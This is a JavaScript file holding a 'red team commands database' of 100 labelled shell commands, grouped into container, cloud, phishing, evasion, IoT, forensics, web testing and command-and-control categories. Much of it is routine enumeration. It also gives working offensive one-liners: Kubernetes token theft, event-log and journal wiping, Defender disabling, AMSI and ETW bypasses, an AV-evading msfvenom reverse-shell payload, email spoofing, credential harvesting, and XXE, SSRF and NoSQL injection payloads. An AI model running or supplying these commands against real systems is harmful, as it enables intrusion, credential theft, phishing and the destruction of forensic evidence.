// Advanced Penetration Testing & Red Team Commands Database

const ADVANCED_PENTESTING_COMMANDS = {
    "Container & Kubernetes Security": [
        { id: 1, name: "Docker Image Analysis", command: "docker run --rm -v /var/run/docker.sock:/var/run/docker.sock -v /tmp:/tmp anchore/anchore-engine", description: "Analyze Docker images for vulnerabilities", category: "Container Security" },
        { id: 2, name: "Docker Escape Check", command: "fdisk -l 2>/dev/null | grep -v loop", description: "Check for container escape possibilities", category: "Container Security" },
        { id: 3, name: "Container Capabilities", command: "capsh --print", description: "Display container capabilities", category: "Container Security" },
        { id: 4, name: "Docker Socket Access", command: "ls -la /var/run/docker.sock", description: "Check Docker socket permissions", category: "Container Security" },
        { id: 5, name: "Kubernetes Token", command: "cat /var/run/secrets/kubernetes.io/serviceaccount/token", description: "Extract Kubernetes service account token", category: "Container Security" },
        { id: 6, name: "Kubectl API Access", command: "kubectl --token={token} --server=https://{kubernetes_api} get pods", description: "Access Kubernetes API with token", category: "Container Security" },
        { id: 7, name: "Docker History", command: "docker history {image}", description: "Show Docker image layer history", category: "Container Security" },
        { id: 8, name: "Container Process List", command: "docker exec {container_id} ps aux", description: "List processes in container", category: "Container Security" },
        { id: 9, name: "Kubernetes Secrets", command: "kubectl get secrets --all-namespaces", description: "List all Kubernetes secrets", category: "Container Security" },
        { id: 10, name: "Container Network", command: "docker network ls", description: "List Docker networks", category: "Container Security" }
    ],
    
    "Cloud Security Testing": [
        { id: 11, name: "AWS CLI Profile", command: "aws configure list", description: "Show current AWS configuration", category: "Cloud Security" },
        { id: 12, name: "AWS S3 Buckets", command: "aws s3 ls", description: "List accessible S3 buckets", category: "Cloud Security" },
        { id: 13, name: "AWS EC2 Instances", command: "aws ec2 describe-instances", description: "List EC2 instances", category: "Cloud Security" },
        { id: 14, name: "AWS IAM Users", command: "aws iam list-users", description: "List IAM users", category: "Cloud Security" },
        { id: 15, name: "AWS Secrets Manager", command: "aws secretsmanager list-secrets", description: "List secrets in AWS Secrets Manager", category: "Cloud Security" },
        { id: 16, name: "AWS Lambda Functions", command: "aws lambda list-functions", description: "List Lambda functions", category: "Cloud Security" },
        { id: 17, name: "Azure CLI Login", command: "az login", description: "Login to Azure CLI", category: "Cloud Security" },
        { id: 18, name: "Azure Resources", command: "az resource list", description: "List Azure resources", category: "Cloud Security" },
        { id: 19, name: "Azure Storage Accounts", command: "az storage account list", description: "List Azure storage accounts", category: "Cloud Security" },
        { id: 20, name: "GCP Auth List", command: "gcloud auth list", description: "List authenticated GCP accounts", category: "Cloud Security" },
        { id: 21, name: "GCP Projects", command: "gcloud projects list", description: "List GCP projects", category: "Cloud Security" },
        { id: 22, name: "GCP Storage Buckets", command: "gsutil ls", description: "List GCP storage buckets", category: "Cloud Security" },
        { id: 23, name: "AWS Instance Metadata", command: "curl http://169.254.169.254/latest/meta-data/", description: "Access AWS instance metadata", category: "Cloud Security" },
        { id: 24, name: "Azure Instance Metadata", command: "curl -H Metadata:true 'http://169.254.169.254/metadata/instance?api-version=2021-02-01'", description: "Access Azure instance metadata", category: "Cloud Security" },
        { id: 25, name: "GCP Instance Metadata", command: "curl -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/'", description: "Access GCP instance metadata", category: "Cloud Security" }
    ],
    
    "Social Engineering": [
        { id: 26, name: "Social Engineer Toolkit", command: "setoolkit", description: "Launch Social Engineer Toolkit", category: "Social Engineering" },
        { id: 27, name: "Gophish Campaign", command: "gophish", description: "Launch Gophish phishing framework", category: "Social Engineering" },
        { id: 28, name: "Email Spoofing", command: "swaks --to {target_email} --from {spoofed_email} --server {smtp_server} --body 'Phishing email content'", description: "Send spoofed email", category: "Social Engineering" },
        { id: 29, name: "Credential Harvester", command: "python3 credentialharvester.py --url {target_url}", description: "Clone website for credential harvesting", category: "Social Engineering" },
        { id: 30, name: "QR Code Generator", command: "qrencode -o malicious.png 'http://{malicious_url}'", description: "Generate malicious QR code", category: "Social Engineering" },
        { id: 31, name: "Beef Framework", command: "beef-xss", description: "Launch Browser Exploitation Framework", category: "Social Engineering" },
        { id: 32, name: "Maltego Investigation", command: "maltego", description: "Launch Maltego for OSINT investigation", category: "Social Engineering" },
        { id: 33, name: "Phone Number OSINT", command: "phoneinfoga scan -n {phone_number}", description: "OSINT investigation on phone number", category: "Social Engineering" },
        { id: 34, name: "Username OSINT", command: "sherlock {username}", description: "Find username across social platforms", category: "Social Engineering" },
        { id: 35, name: "Email OSINT", command: "holehe {email}", description: "Check email registration across platforms", category: "Social Engineering" }
    ],
    
    "Evasion & Anti-Forensics": [
        { id: 36, name: "Clear Event Logs", command: "wevtutil cl System && wevtutil cl Application && wevtutil cl Security", description: "Clear Windows event logs", category: "Anti-Forensics" },
        { id: 37, name: "Timestomp", command: "timestomp {file} -m \"01/01/2020 00:00:00\"", description: "Modify file timestamps", category: "Anti-Forensics" },
        { id: 38, name: "Secure Delete", command: "sdelete -z -s {file_or_directory}", description: "Securely delete files", category: "Anti-Forensics" },
        { id: 39, name: "Clear USN Journal", command: "fsutil usn deletejournal /d c:", description: "Clear USN change journal", category: "Anti-Forensics" },
        { id: 40, name: "Clear Prefetch", command: "del /q /f c:\\windows\\prefetch\\*", description: "Clear prefetch files", category: "Anti-Forensics" },
        { id: 41, name: "Disable Windows Defender", command: "powershell -c 'Set-MpPreference -DisableRealtimeMonitoring $true'", description: "Disable Windows Defender", category: "Evasion" },
        { id: 42, name: "AMSI Bypass", command: "powershell -c '[Ref].Assembly.GetType(\"System.Management.Automation.AmsiUtils\").GetField(\"amsiInitFailed\",\"NonPublic,Static\").SetValue($null,$true)'", description: "Bypass AMSI protection", category: "Evasion" },
        { id: 43, name: "ETW Bypass", command: "powershell -c '[System.Diagnostics.Eventing.EventProvider].GetField(\"m_enabled\", \"NonPublic,Instance\").SetValue([Ref].Assembly.GetType(\"System.Management.Automation.Tracing.PSEtwLogProvider\").GetField(\"etwProvider\", \"NonPublic,Static\").GetValue($null), 0)'", description: "Bypass ETW logging", category: "Evasion" },
        { id: 44, name: "Execution Policy Bypass", command: "powershell -ep bypass -c 'Get-Process'", description: "Bypass PowerShell execution policy", category: "Evasion" },
        { id: 45, name: "AV Evasion Encoder", command: "msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -e x86/shikata_ga_nai -i 10 -f exe", description: "Encode payload for AV evasion", category: "Evasion" }
    ],
    
    "IoT & Embedded Security": [
        { id: 46, name: "Nmap IoT Scan", command: "nmap -sS -O -p 21,22,23,53,80,443,993,995,8080,8081 {ip_range}", description: "Scan for IoT devices", category: "IoT Security" },
        { id: 47, name: "MQTT Discovery", command: "nmap -p 1883,8883 --script mqtt-subscribe {ip_range}", description: "Discover MQTT brokers", category: "IoT Security" },
        { id: 48, name: "CoAP Discovery", command: "coap-client -m get coap://{ip}/.well-known/core", description: "Discover CoAP resources", category: "IoT Security" },
        { id: 49, name: "Modbus Scanner", command: "nmap --script modbus-discover {ip_range}", description: "Scan for Modbus devices", category: "IoT Security" },
        { id: 50, name: "UPnP Discovery", command: "nmap -sU -p 1900 --script upnp-info {ip_range}", description: "Discover UPnP devices", category: "IoT Security" },
        { id: 51, name: "SNMP IoT Scan", command: "onesixtyone -c community.txt {ip_range}", description: "SNMP scan for IoT devices", category: "IoT Security" },
        { id: 52, name: "Shodan IoT Search", command: "shodan search 'port:23 console'", description: "Search Shodan for IoT devices", category: "IoT Security" },
        { id: 53, name: "Firmware Analysis", command: "binwalk -e {firmware_file}", description: "Extract firmware components", category: "IoT Security" },
        { id: 54, name: "Router Default Creds", command: "hydra -C /usr/share/seclists/Passwords/Default-Credentials/default-passwords.csv {ip} http-get /", description: "Test default credentials", category: "IoT Security" },
        { id: 55, name: "Serial Port Scan", command: "screen /dev/ttyUSB0 115200", description: "Connect to serial console", category: "IoT Security" }
    ],
    
    "Incident Response & Forensics": [
        { id: 56, name: "Memory Dump", command: "dd if=/dev/mem of=memory.dump bs=1M", description: "Create memory dump", category: "Forensics" },
        { id: 57, name: "Volatility Profile", command: "volatility -f memory.dump imageinfo", description: "Identify memory dump profile", category: "Forensics" },
        { id: 58, name: "Process List", command: "volatility -f memory.dump --profile={profile} pslist", description: "List processes from memory", category: "Forensics" },
        { id: 59, name: "Network Connections", command: "volatility -f memory.dump --profile={profile} netscan", description: "Extract network connections", category: "Forensics" },
        { id: 60, name: "Registry Hives", command: "volatility -f memory.dump --profile={profile} hivelist", description: "List registry hives", category: "Forensics" },
        { id: 61, name: "Autopsy Investigation", command: "autopsy", description: "Launch Autopsy forensic platform", category: "Forensics" },
        { id: 62, name: "Sleuthkit Analysis", command: "fls -r {disk_image}", description: "List files in disk image", category: "Forensics" },
        { id: 63, name: "File Carving", command: "foremost -i {disk_image} -o output/", description: "Recover deleted files", category: "Forensics" },
        { id: 64, name: "Hash Verification", command: "md5sum {file} && sha256sum {file}", description: "Calculate file hashes", category: "Forensics" },
        { id: 65, name: "Timeline Analysis", command: "log2timeline.py --parsers=win7 timeline.plaso {evidence_file}", description: "Create forensic timeline", category: "Forensics" }
    ],
    
    "Cryptography & Hash Analysis": [
        { id: 66, name: "Hash Identifier", command: "hash-identifier", description: "Identify hash type", category: "Cryptography" },
        { id: 67, name: "John Hash Formats", command: "john --list=formats", description: "List John the Ripper formats", category: "Cryptography" },
        { id: 68, name: "Hashcat Hash Types", command: "hashcat --help | grep -E '^\\s+[0-9]+'", description: "List Hashcat hash types", category: "Cryptography" },
        { id: 69, name: "Base64 Decode", command: "echo '{encoded_string}' | base64 -d", description: "Decode base64 string", category: "Cryptography" },
        { id: 70, name: "ROT13 Decode", command: "echo '{text}' | tr 'A-Za-z' 'N-ZA-Mn-za-m'", description: "Decode ROT13 text", category: "Cryptography" },
        { id: 71, name: "URL Decode", command: "python3 -c \"import urllib.parse; print(urllib.parse.unquote('{url}'))\"", description: "URL decode string", category: "Cryptography" },
        { id: 72, name: "Hex to ASCII", command: "echo '{hex_string}' | xxd -r -p", description: "Convert hex to ASCII", category: "Cryptography" },
        { id: 73, name: "CyberChef Analysis", command: "firefox https://gchq.github.io/CyberChef/", description: "Open CyberChef for crypto analysis", category: "Cryptography" },
        { id: 74, name: "OpenSSL Decrypt", command: "openssl enc -aes-256-cbc -d -in {encrypted_file} -out {decrypted_file} -k {password}", description: "Decrypt file with OpenSSL", category: "Cryptography" },
        { id: 75, name: "GPG Decrypt", command: "gpg --decrypt {encrypted_file}", description: "Decrypt GPG encrypted file", category: "Cryptography" }
    ],
    
    "Advanced Web Application Testing": [
        { id: 76, name: "JWT Token Analysis", command: "python3 jwt_tool.py {jwt_token}", description: "Analyze JWT token", category: "Advanced Web Testing" },
        { id: 77, name: "GraphQL Introspection", command: "curl -X POST {graphql_endpoint} -H 'Content-Type: application/json' -d '{\"query\":\"query IntrospectionQuery { __schema { queryType { name } } }\"}'", description: "GraphQL introspection query", category: "Advanced Web Testing" },
        { id: 78, name: "NoSQL Injection", command: "curl -X POST {api_endpoint} -d '{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}'", description: "NoSQL injection test", category: "Advanced Web Testing" },
        { id: 79, name: "XXE Injection", command: "curl -X POST {xml_endpoint} -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY file SYSTEM \"file:///etc/passwd\">]><data>&file;</data>'", description: "XML External Entity injection", category: "Advanced Web Testing" },
        { id: 80, name: "SSTI Detection", command: "curl '{url}?name={{7*7}}'", description: "Server-Side Template Injection test", category: "Advanced Web Testing" },
        { id: 81, name: "SSRF Testing", command: "curl '{url}?url=http://169.254.169.254/latest/meta-data/'", description: "Server-Side Request Forgery test", category: "Advanced Web Testing" },
        { id: 82, name: "Race Condition", command: "for i in {1..100}; do curl -X POST {endpoint} & done", description: "Test for race conditions", category: "Advanced Web Testing" },
        { id: 83, name: "HTTP Desync", command: "python3 http_desync.py --url {target_url}", description: "HTTP request smuggling test", category: "Advanced Web Testing" },
        { id: 84, name: "WebSocket Testing", command: "wscat -c ws://{websocket_url}", description: "Connect to WebSocket endpoint", category: "Advanced Web Testing" },
        { id: 85, name: "API Fuzzing", command: "ffuf -u {api_endpoint}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt", description: "Fuzz API endpoints", category: "Advanced Web Testing" }
    ],
    
    "Red Team C2 Frameworks": [
        { id: 86, name: "Cobalt Strike Beacon", command: "beacon> shell whoami", description: "Execute shell command via Cobalt Strike", category: "C2 Frameworks" },
        { id: 87, name: "Empire Agent", command: "agents> interact {agent_name}", description: "Interact with Empire agent", category: "C2 Frameworks" },
        { id: 88, name: "Covenant Grunt", command: "Grunt> shell whoami", description: "Execute command via Covenant", category: "C2 Frameworks" },
        { id: 89, name: "Sliver Implant", command: "sliver > shell", description: "Get shell on Sliver implant", category: "C2 Frameworks" },
        { id: 90, name: "Metasploit Session", command: "sessions -i {session_id}", description: "Interact with Metasploit session", category: "C2 Frameworks" },
        { id: 91, name: "PoshC2 Implant", command: "posh-server", description: "Start PoshC2 server", category: "C2 Frameworks" },
        { id: 92, name: "Mythic Agent", command: "mythic-cli payload create", description: "Create Mythic payload", category: "C2 Frameworks" },
        { id: 93, name: "SILENTTRINITY", command: "st> stagers", description: "List SILENTTRINITY stagers", category: "C2 Frameworks" },
        { id: 94, name: "Koadic Zombie", command: "koadic> zombies", description: "List Koadic zombies", category: "C2 Frameworks" },
        { id: 95, name: "Pupy Session", command: "pupy> sessions", description: "List Pupy sessions", category: "C2 Frameworks" },
        { id: 96, name: "Villain Framework", command: "villain", description: "Start Villain C2 framework", category: "C2 Frameworks" },
        { id: 97, name: "Havoc Demon", command: "demon> shell whoami", description: "Execute command via Havoc", category: "C2 Frameworks" },
        { id: 98, name: "Brute Ratel", command: "badger> shell whoami", description: "Execute command via Brute Ratel", category: "C2 Frameworks" },
        { id: 99, name: "Merlin Agent", command: "merlin[agent][{id}]> shell whoami", description: "Execute command via Merlin", category: "C2 Frameworks" },
        { id: 100, name: "Faction Agent", command: "faction> agents", description: "List Faction agents", category: "C2 Frameworks" }
    ]
};